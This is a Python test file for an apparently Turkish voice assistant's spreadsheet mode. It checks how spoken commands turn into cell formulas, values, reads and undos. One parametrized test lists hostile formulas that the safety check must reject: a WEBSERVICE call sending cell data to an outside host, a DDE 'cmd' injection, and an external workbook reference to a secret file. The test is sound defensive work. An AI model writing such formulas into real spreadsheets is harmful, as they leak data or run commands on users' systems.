from pathlib import Path

import pytest

from bilge.core.speech.turkish_number_parser import digitize
from bilge.core.spreadsheet import spreadsheet_command, spreadsheet_evaluator, spreadsheet_formula
from bilge.core.spreadsheet.cell_reference import CellReference, SpreadsheetNumber, SpreadsheetText
from bilge.core.spreadsheet.spreadsheet_command import (
    Clear,
    Copy,
    Evaluate,
    Finish,
    Read,
    SetFormula,
    SetValue,
    SpreadsheetCommand,
    Undo,
)

# The routing benchmark lives in the Swift repository next to this one.
BENCH = Path(__file__).resolve().parents[3] / "bench"


def parse(text: str) -> SpreadsheetCommand | None:
    return spreadsheet_command.parse(digitize(text))


def cell(text: str) -> CellReference:
    reference = CellReference.parse(text)
    assert reference is not None
    return reference


@pytest.mark.parametrize(
    ("text", "expected"),
    [("D3", "D3"), ("aa12", "AA12"), ("b 1", None), ("XFE1", None), ("A0", None)],
)
def test_cell_references_in_written_and_spoken_form(text: str, expected: str | None) -> None:
    reference = CellReference.parse(text)
    assert (reference.address if reference else None) == expected


@pytest.mark.parametrize(
    "text",
    [
        "D3'e B2 ile B1'i topla",
        "D3'e B2 + B1'i topla",
        "d3 e b2 ve b1 i topla",
        "de üç'e be iki ile be bir'i topla",
        "B2 ile B1'i topla D3'e yaz",
        "B2 ile B1'i toplayıp D3'e yaz",
        "D3 hücresine B2 ile B1'i topla",
    ],
)
def test_adding_two_cells_into_a_third_however_it_was_heard(text: str) -> None:
    assert parse(text) == SetFormula(cell("D3"), "=B2+B1")


@pytest.mark.parametrize(
    ("text", "formula"),
    [
        ("D3'e B2 artı B1 yaz", "=B2+B1"),
        ("D3 eşittir B2 çarpı 1,2", "=B2*1.2"),
        ("E5'e C5 eksi D5 bölü 2 yaz", "=C5-D5/2"),
        ("F1'e A1 ile A2 ve A3'ü topla", "=A1+A2+A3"),
        ("D3'e B2'den B1'i çıkar", "=B2-B1"),
        ("D3'e B2 ile 3'ü çarp", "=B2*3"),
        ("D3'e B2'yi B1'e böl", "=B2/B1"),
    ],
)
def test_arithmetic_with_spoken_operators_and_numbers(text: str, formula: str) -> None:
    command = parse(text)
    assert isinstance(command, SetFormula), f"{text} not parsed: {command}"
    assert command.formula == formula


@pytest.mark.parametrize(
    ("text", "target", "formula"),
    [
        ("B10'a B1'den B9'a kadar topla", "B10", "=SUM(B1:B9)"),
        ("B1'den B9'a kadar olan toplamı B10'a yaz", "B10", "=SUM(B1:B9)"),
        ("C12'ye C2 ile C11 arasının ortalamasını yaz", "C12", "=AVERAGE(C2:C11)"),
        ("D1'e A1'den A20'ye kadar en büyük değeri yaz", "D1", "=MAX(A1:A20)"),
        ("D2'ye A1'den A20'ye kadar en küçüğünü yaz", "D2", "=MIN(A1:A20)"),
    ],
)
def test_functions_over_a_range(text: str, target: str, formula: str) -> None:
    assert parse(text) == SetFormula(cell(target), formula)


def test_writing_a_number_or_a_word() -> None:
    assert parse("C5'e 1250 yaz") == SetValue(cell("C5"), SpreadsheetNumber(1250))
    assert parse("C5'e 12,5 yaz") == SetValue(cell("C5"), SpreadsheetNumber(12.5))
    assert parse("A1'e Kira Gideri yaz") == SetValue(cell("A1"), SpreadsheetText("Kira Gideri"))


def test_reading_clearing_and_copying() -> None:
    assert parse("D3'ü oku") == Read(cell("D3"))
    assert parse("D3 kaç") == Read(cell("D3"))
    assert parse("D3'te ne var") == Read(cell("D3"))
    assert parse("D3'ü sil") == Clear(cell("D3"))
    assert parse("D3'ü temizle") == Clear(cell("D3"))
    assert parse("D3'ü E3'e kopyala") == Copy(cell("D3"), cell("E3"))


def test_questions_about_a_range_are_answered_without_writing() -> None:
    assert parse("B1'den B9'a kadar toplam kaç") == Evaluate("SUM(B1:B9)")
    assert parse("C sütununun ortalaması ne") == Evaluate("AVERAGE(C:C)")
    assert parse("B2 ile B1'in toplamı kaç") == Evaluate("B2+B1")


def test_undo_and_leaving_spreadsheet_mode() -> None:
    assert parse("geri al") == Undo()
    assert parse("son işlemi geri al") == Undo()
    assert parse("tamam bitti") == Finish()
    assert parse("Excel modundan çık") == Finish()


@pytest.mark.parametrize(
    "text",
    [
        "Safari'yi aç",
        "B12 vitamini nedir",
        "saat 3'te toplantı ekle",
        "5 dakika sonra hatırlat",
        "Ahmet'e mesaj at",
        "sesi yüzde 30 yap",
        "yarın hava nasıl",
        "iPhone 15 kaç lira",
    ],
)
def test_everyday_sentences_are_not_spreadsheet_commands(text: str) -> None:
    assert parse(text) is None


def test_none_of_the_routing_benchmark_commands_is_taken_for_a_spreadsheet_command() -> None:
    files = [
        path
        for path in BENCH.iterdir()
        if (path.suffix == ".tsv" and path.name.startswith("llm")) or path.name.startswith("realworld")
    ]
    assert files
    for path in files:
        for line in filter(None, path.read_text(encoding="utf-8").split("\n")):
            command = next(iter(filter(None, line.split("\t"))), "")
            assert parse(command) is None, f"{path.name}: {command} → {parse(command)}"


@pytest.mark.parametrize(
    ("formula", "safe"),
    [
        ("=C2*1,2", True),
        ("=SUM(B1:B9)/COUNT(B1:B9)", True),
        ('=IF(A1>100,"Yüksek","Düşük")', False),
        ('=IF(A1>100,"Yuksek","Dusuk")', True),
        ("=Sheet2!A1*2", True),
        ('=WEBSERVICE("http://x.com/?"&A1)', False),
        ('=HYPERLINK("http://x")', False),
        ("=cmd|' /C calc'!A0", False),
        ("='[secret.xlsx]Sheet1'!A1", False),
        ("C2*2", False),
        ("=", False),
        ("=INDIRECT(A1)", False),
        ('=WEBSERVICE ("http://x.com/?"&A1)', False),
        ("=MyMacro(A1)", False),
        ('=ROUND(AVERAGE(B1:B9), 2)&" TL"', True),
    ],
)
def test_model_written_formulas_are_limited_to_plain_calculation(formula: str, safe: bool) -> None:
    assert spreadsheet_formula.is_safe(formula) is safe


def test_requests_that_talk_about_cells_are_recognized_for_the_model_fallback() -> None:
    assert spreadsheet_command.mentions_cells("D2'ye C2'nin KDV'li fiyatını hesapla")
    assert spreadsheet_command.mentions_cells("bu sütunu biçimlendir")
    assert not spreadsheet_command.mentions_cells("akşam ne yiyoruz")


def test_questions_are_computed_from_the_values_read_from_the_sheet() -> None:
    assert spreadsheet_evaluator.references("SUM(B1:B9)") == ["B1:B9"]
    assert spreadsheet_evaluator.references("B2+B1*2") == ["B2", "B1"]
    assert spreadsheet_evaluator.references("AVERAGE(C:C)") == ["C:C"]
    values = {"B1:B9": ["4.0", "20,5", "", "Kira"], "B2": ["20.5"], "B1": ["4"]}
    assert spreadsheet_evaluator.evaluate("SUM(B1:B9)", values) == 24.5
    assert spreadsheet_evaluator.evaluate("AVERAGE(B1:B9)", values) == 12.25
    assert spreadsheet_evaluator.evaluate("COUNT(B1:B9)", values) == 2
    assert spreadsheet_evaluator.evaluate("MAX(B1:B9)", values) == 20.5
    assert spreadsheet_evaluator.evaluate("B2+B1*2", values) == 28.5
    assert spreadsheet_evaluator.evaluate("B2/B3", values) is None
    assert spreadsheet_evaluator.evaluate("AVERAGE(D1:D9)", {}) is None
